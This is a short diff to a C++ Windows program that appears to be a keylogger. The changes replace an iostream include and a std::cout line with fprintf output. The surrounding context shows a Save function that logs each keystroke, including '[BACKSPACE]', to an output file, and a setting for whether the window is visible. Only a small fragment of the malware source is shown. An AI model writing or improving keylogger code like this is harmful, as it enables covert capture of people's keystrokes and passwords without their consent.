@@ -1,6 +1,6 @@
 #include <Windows.h>
 #include <time.h>
-#include <iostream>
+
 #include <cstdio>
 
 // defines whether the window is visible or not
@@ -89,7 +89,7 @@ int Save(int key_stroke, char *file)
     }
 
 
-	std::cout << key_stroke << '\n';
+	fprintf(stdout,"%d",key_stroke);
 
 	if (key_stroke == VK_BACK)
 		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
